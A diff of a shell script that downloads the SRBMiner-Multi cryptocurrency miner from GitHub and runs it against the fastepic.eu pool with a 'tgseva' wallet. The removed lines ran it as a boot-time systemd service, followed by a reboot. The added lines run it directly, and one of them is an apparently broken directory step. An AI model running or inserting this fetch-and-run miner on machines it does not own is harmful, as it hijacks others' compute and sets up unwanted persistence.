@@ -1,9 +1,10 @@
-cd /usr/local/bin
+#!/bin/sh
 myworker=$(date +'%d%m')
-sudo apt install libc6 -y
-sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz
-sudo tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz
-sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/SRBMiner-Multi-2-2-9/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+ssl://fastepic.eu:3418 --wallet tgseva."'${myworker}_innew'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/verus.service'
-sudo systemctl daemon-reload
-sudo systemctl enable verus.service
-sudo reboot &
+apt install libc6 -y
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz
+tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz
+SRBMiner-Multi-2-2-9
+chmod 700 SRBMiner-MULTI
+chmod +x SRBMiner-MULTI
+./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+ssl://fastepic.eu:3418 --wallet tgseva."'${myworker}_innew'" --password x --cpu-threads 8
+
